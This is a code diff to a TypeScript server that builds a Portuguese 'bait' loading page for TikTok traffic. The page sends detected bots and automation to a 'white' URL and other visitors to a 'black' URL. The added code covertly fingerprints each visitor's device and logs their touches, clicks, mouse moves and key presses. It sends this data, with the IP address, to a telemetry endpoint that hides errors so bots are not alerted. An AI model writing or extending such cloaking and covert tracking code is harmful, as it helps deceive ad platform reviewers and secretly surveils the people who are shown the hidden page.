@@ -6,6 +6,7 @@ import { randomBytes, createHash } from "crypto";
 import { getStripeClient, getStripePublishableKey, isStripeConfigured } from "./stripeClient";
 import { sql } from "drizzle-orm";
 import { db } from "./db";
+import { tiktok2Telemetry } from "@shared/schema";
 import { promises as dns } from "dns";
 
 // ==========================================
@@ -112,10 +113,10 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
   const safeWhiteUrl = sanitizeUrl(whiteUrl);
   
   // Use absolute URLs to avoid routing issues with custom domains
-  // Using /go/ and /track/ routes that are less likely to be blocked by proxies
   const prefix = baseUrl ? baseUrl : '';
   const botLogUrl = `${prefix}/track/${token}`;
   const verifyUrl = `${prefix}/go/${token}`;
+  const telemetryUrl = `${prefix}/tt2/telemetry`;
   
   return `<!DOCTYPE html>
 <html lang="pt-BR">
@@ -141,7 +142,7 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
     <p class="t">Carregando...</p>
   </div>
   
-  <!-- Non-JS fallback beacon - logs when meta refresh triggers -->
+  <!-- Non-JS fallback beacon -->
   <noscript>
     <img src="/b/${token}?r=no_js" width="1" height="1" alt="" style="position:absolute;left:-9999px">
   </noscript>
@@ -153,45 +154,119 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
   
   <script>
     (function(){
-      var w='${safeWhiteUrl}',b='${verifyUrl}',bl='${botLogUrl}',d=${delay};
+      var w='${safeWhiteUrl}',b='${verifyUrl}',bl='${botLogUrl}',d=${delay},tUrl='${telemetryUrl}',tk='${token}';
+      var T={tk:tk,start:Date.now(),events:[],touch:0,click:0,scroll:0,mouse:0,key:0,vis:0,focus:0,hp:false,trap:false,bot:null};
       
+      // Collect device fingerprint
+      T.screen={w:screen.width,h:screen.height};
+      T.viewport={w:window.innerWidth,h:window.innerHeight};
+      T.dpr=window.devicePixelRatio||1;
+      T.cd=screen.colorDepth;
+      T.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+      T.lang=navigator.language;
+      T.langs=navigator.languages?navigator.languages.join(','):'';
+      T.plat=navigator.platform;
+      T.hw=navigator.hardwareConcurrency||0;
+      T.mem=navigator.deviceMemory||0;
+      T.mtp=navigator.maxTouchPoints||0;
+      T.ua=navigator.userAgent;
+      
+      // Bot indicators
+      T.wd=!!navigator.webdriver;
+      T.auto=!!(window.callPhantom||window._phantom||window.__nightmare||window.domAutomation||window.selenium);
+      T.fakeC=!window.chrome&&navigator.userAgent.toLowerCase().indexOf('chrome')>-1;
+      T.noLang=typeof navigator.languages==='undefined'||navigator.languages.length===0;
+      
+      // Performance timing
+      try{
+        var p=performance.timing;
+        T.dcl=p.domContentLoadedEventEnd-p.navigationStart;
+        T.load=p.loadEventEnd-p.navigationStart;
+      }catch(e){}
+      
+      // Connection info
+      try{
+        var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+        if(c)T.conn=c.effectiveType||c.type||'unknown';
+      }catch(e){}
+      
+      // Event logging with timestamp
+      function logE(type,data){T.events.push({t:Date.now()-T.start,type:type,d:data})}
+      
+      // CRITICAL: Any interaction on loading page = suspicious
+      // Touch events (mobile)
+      document.addEventListener('touchstart',function(e){T.touch++;logE('touch',{x:e.touches[0].clientX,y:e.touches[0].clientY})});
+      document.addEventListener('touchmove',function(e){logE('touchmove',{x:e.touches[0].clientX,y:e.touches[0].clientY})});
+      
+      // Click events
+      document.addEventListener('click',function(e){T.click++;logE('click',{x:e.clientX,y:e.clientY})});
+      
+      // Mouse events (should NOT happen on TikTok mobile)
+      document.addEventListener('mousemove',function(e){T.mouse++;logE('mouse',{x:e.clientX,y:e.clientY})});
+      
+      // Scroll (suspicious on loading page)
+      document.addEventListener('scroll',function(){T.scroll++;logE('scroll',{y:window.scrollY})});
+      
+      // Key events (very suspicious)
+      document.addEventListener('keydown',function(e){T.key++;logE('key',{k:e.key})});
+      
+      // Visibility changes
+      document.addEventListener('visibilitychange',function(){T.vis++;logE('vis',{h:document.hidden})});
+      
+      // Focus changes
+      window.addEventListener('blur',function(){T.focus++;logE('blur',{})});
+      window.addEventListener('focus',function(){T.focus++;logE('focus',{})});
+      
+      // Honeypot listeners
+      var hp=document.getElementById('${honeypotId}');
+      var tl=document.getElementById('${trapLinkId}');
+      if(hp){hp.addEventListener('focus',function(){T.hp=true;logE('honeypot',{})})}
+      if(tl){tl.addEventListener('click',function(e){e.preventDefault();T.trap=true;logE('trap',{})})}
+      
+      // Mouse teleport detection
+      var lastX=0,lastY=0,teleport=0;
+      document.addEventListener('mousemove',function(e){
+        if(lastX!==0&&lastY!==0){
+          var dx=Math.abs(e.clientX-lastX),dy=Math.abs(e.clientY-lastY);
+          if(dx>300||dy>300)teleport++;
+        }
+        lastX=e.clientX;lastY=e.clientY;
+      });
+      
+      // Send telemetry before redirect
+      function sendT(dest){
+        T.total=Date.now()-T.start;
+        T.dest=dest;
+        T.teleport=teleport;
+        var data=JSON.stringify(T);
+        try{
+          if(navigator.sendBeacon){navigator.sendBeacon(tUrl,data)}
+          else{var x=new XMLHttpRequest();x.open('POST',tUrl,false);x.setRequestHeader('Content-Type','application/json');x.send(data)}
+        }catch(e){}
+      }
+      
+      // Bot detection
       function logBot(r){
+        T.bot=r;
+        sendT('white');
         var img=new Image();
         img.src=bl+'&r='+encodeURIComponent(r);
         setTimeout(function(){window.location=w},50);
       }
       
-      // Bot detection checks
-      var wd=navigator.webdriver||window.callPhantom||window._phantom||window.__nightmare||window.domAutomation||window.selenium;
-      if(wd){logBot('webdriver');return}
-      
-      // Check for automation frameworks
+      // Check for bots
+      if(T.wd){logBot('webdriver');return}
+      if(T.auto){logBot('automation');return}
       var ua=navigator.userAgent.toLowerCase();
-      if(ua.indexOf('headless')>-1||ua.indexOf('phantom')>-1||ua.indexOf('selenium')>-1){logBot('automation');return}
-      
-      // Check for missing browser features
-      if(!window.chrome&&ua.indexOf('chrome')>-1){logBot('fake_chrome');return}
-      if(typeof navigator.languages==='undefined'||navigator.languages.length===0){logBot('no_languages');return}
-      
-      // Honeypot listeners - any interaction = bot
-      var hp=document.getElementById('${honeypotId}');
-      var tl=document.getElementById('${trapLinkId}');
-      if(hp){hp.addEventListener('focus',function(){logBot('honeypot')})}
-      if(tl){tl.addEventListener('click',function(e){e.preventDefault();logBot('trap_link')})}
-      
-      // Impossible mouse movement detection
-      var lastX=0,lastY=0,teleport=0;
-      document.addEventListener('mousemove',function(e){
-        if(lastX!==0&&lastY!==0){
-          var dx=Math.abs(e.clientX-lastX),dy=Math.abs(e.clientY-lastY);
-          if(dx>300||dy>300){teleport++}
-          if(teleport>2){logBot('mouse_teleport')}
-        }
-        lastX=e.clientX;lastY=e.clientY;
-      });
+      if(ua.indexOf('headless')>-1||ua.indexOf('phantom')>-1||ua.indexOf('selenium')>-1){logBot('automation_ua');return}
+      if(T.fakeC){logBot('fake_chrome');return}
+      if(T.noLang){logBot('no_languages');return}
       
       // Redirect to BLACK after delay
-      setTimeout(function(){window.location=b},d);
+      setTimeout(function(){
+        sendT('black');
+        window.location=b;
+      },d);
     })();
   </script>
 </body>
@@ -633,6 +708,93 @@ export async function registerRoutes(
     const reason = (req.query.r as string) || 'unknown';
     console.log(`[TikTok2] Bot detection via /track/:token - Token: ${token?.substring(0, 16)}...`);
     return handleBotDetection(token, reason, res);
+  });
+  
+  // ==========================================
+  // TIKTOK2 TELEMETRY ENDPOINT - Collects behavioral data
+  // ==========================================
+  app.post("/tt2/telemetry", async (req: Request, res: Response) => {
+    try {
+      const data = req.body;
+      const token = data.tk;
+      
+      if (!token) {
+        return res.status(200).send('ok');
+      }
+      
+      const baitData = tiktok2BaitTokens.get(token);
+      const clientIp = req.headers['x-forwarded-for']?.toString().split(',')[0] || req.socket.remoteAddress || 'unknown';
+      
+      console.log(`[TikTok2 Telemetry] Token: ${token.substring(0, 16)}... | Dest: ${data.dest} | Time: ${data.total}ms | Touch: ${data.touch} | Mouse: ${data.mouse} | Click: ${data.click}`);
+      
+      // Save telemetry to database
+      await db.insert(tiktok2Telemetry).values({
+        token: token,
+        offerId: baitData?.offerId || null,
+        ipAddress: clientIp,
+        userAgent: data.ua || null,
+        
+        // Timing
+        pageLoadTime: data.load || null,
+        timeToFirstInteraction: data.events?.[0]?.t || null,
+        timeToRedirect: data.total || null,
+        totalTimeOnPage: data.total || null,
+        
+        // Interactions (should be ZERO on loading page)
+        touchCount: data.touch || 0,
+        clickCount: data.click || 0,
+        scrollCount: data.scroll || 0,
+        mouseMoveCount: data.mouse || 0,
+        keyPressCount: data.key || 0,
+        
+        // Device fingerprint
+        screenWidth: data.screen?.w || null,
+        screenHeight: data.screen?.h || null,
+        viewportWidth: data.viewport?.w || null,
+        viewportHeight: data.viewport?.h || null,
+        devicePixelRatio: data.dpr?.toString() || null,
+        colorDepth: data.cd || null,
+        timezone: data.tz || null,
+        language: data.lang || null,
+        languages: data.langs || null,
+        platform: data.plat || null,
+        hardwareConcurrency: data.hw || null,
+        deviceMemory: data.mem?.toString() || null,
+        maxTouchPoints: data.mtp || null,
+        
+        // Bot indicators
+        hasWebdriver: data.wd || false,
+        hasAutomation: data.auto || false,
+        hasFakeChrome: data.fakeC || false,
+        hasNoLanguages: data.noLang || false,
+        
+        // Performance
+        connectionType: data.conn || null,
+        domContentLoaded: data.dcl || null,
+        loadEventEnd: data.load || null,
+        
+        // Visibility/focus
+        visibilityChanges: data.vis || 0,
+        focusChanges: data.focus || 0,
+        
+        // Honeypot
+        honeypotTriggered: data.hp || false,
+        trapLinkClicked: data.trap || false,
+        
+        // Event log (full timeline)
+        eventLog: data.events || [],
+        
+        // Outcome
+        redirectedTo: data.dest || null,
+        isBotDetected: data.bot !== null,
+        botReason: data.bot || null,
+      });
+      
+      res.status(200).send('ok');
+    } catch (error) {
+      console.error('[TikTok2 Telemetry] Error:', error);
+      res.status(200).send('ok'); // Always return 200 to not alert bots
+    }
   });
   
   // Legacy route: /api/tt2-bot
